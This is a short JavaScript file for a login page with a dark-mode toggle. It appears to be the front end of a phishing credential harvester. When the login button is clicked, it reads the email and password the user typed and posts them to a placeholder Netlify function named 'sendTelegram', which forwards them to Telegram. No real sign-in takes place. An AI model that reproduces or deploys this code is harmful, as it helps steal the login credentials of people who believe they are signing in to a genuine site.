const loginBtn = document.getElementById("loginBtn");
const darkToggle = document.getElementById("darkToggle");
const container = document.querySelector(".login-container");

loginBtn.addEventListener("click", async () => {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill both email and password!");
    return;
  }

  try {
    const res = await fetch("https://YOUR_NETLIFY_FUNCTION_URL/.netlify/functions/sendTelegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    if (data.success) {
      alert("Login sent to Telegram!");
    } else {
      alert("Error sending message.");
    }
  } catch (err) {
    console.error(err);
    alert("Network error!");
  }
});

darkToggle.addEventListener("click", () => {
  container.classList.toggle("dark");
});
